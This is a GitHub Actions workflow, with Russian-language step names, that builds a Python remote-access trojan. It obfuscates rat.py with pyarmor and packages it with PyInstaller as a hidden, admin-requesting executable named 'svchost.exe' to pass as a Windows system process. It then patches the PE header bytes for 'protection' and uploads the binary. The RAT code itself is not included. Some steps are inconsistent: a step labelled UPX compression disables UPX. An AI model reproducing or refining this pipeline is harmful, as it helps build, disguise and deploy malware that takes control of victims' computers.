name: Build Protected RAT
on: [push]

jobs:
  build:
    runs-on: windows-latest
    steps:
      - uses: actions/checkout@v4
      
      - uses: actions/setup-python@v5
        with:
          python-version: '3.11'
      
      - name: Установка
        run: |
          pip install pyinstaller
          pip install pyarmor
          pip install pycryptodome
          pip install discord.py
      
      - name: Обфускация (максимальная)
        run: |
          pyarmor obfuscate --restrict=0 --recursive --obf-code=1 --wrap-mode=0 rat.py
          
      - name: Компиляция с UPX сжатием
        run: |
          pyinstaller --onefile --noconsole --name svchost --strip --uac-admin --noupx rat.py
          
      - name: Шифрование секций
        run: |
          python -c "
          import struct
          with open('dist/svchost.exe', 'r+b') as f:
              # Изменяем заголовок PE для защиты
              f.seek(0x3C)
              pe_offset = struct.unpack('<I', f.read(4))[0]
              f.seek(pe_offset + 16)
              f.write(b'\x02\x01\x80\x00')  # Изменяем характеристики
          "
      
      - uses: actions/upload-artifact@v4
        with:
          name: svchost_protected
          path: dist/svchost.exe
